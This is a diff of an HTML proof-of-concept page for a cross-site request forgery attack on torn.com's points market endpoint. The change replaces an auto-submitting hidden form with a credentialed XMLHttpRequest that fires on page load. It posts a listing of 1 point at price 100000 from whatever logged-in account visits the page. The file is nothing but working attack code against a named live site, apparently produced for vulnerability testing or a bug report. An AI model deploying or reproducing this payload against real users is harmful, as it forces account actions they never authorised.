@@ -1,14 +1,24 @@
 <html>
   <body>
-    <form action="https://www.torn.com/pmarket.php?ajax_action=addlisting1" method="POST">
-      <input type="hidden" name="points" value="1" />
-      <input type="hidden" name="price" value="100000" />
-      <input type="hidden" name="confirm" value="true" />
-      <input type="submit" value="Submit request" />
-    </form>
     <script>
-      history.pushState('', '', '/');
-      document.forms[0].submit();
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https:\/\/www.torn.com\/pmarket.php?ajax_action=addlisting1", true);
+        xhr.setRequestHeader("accept", "*\/*");
+        xhr.setRequestHeader("accept-language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("content-type", "application\/x-www-form-urlencoded; charset=UTF-8");
+        xhr.withCredentials = true;
+        var body = "points=1&price=100000&confirm=true";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+      submitRequest();
     </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
   </body>
 </html>
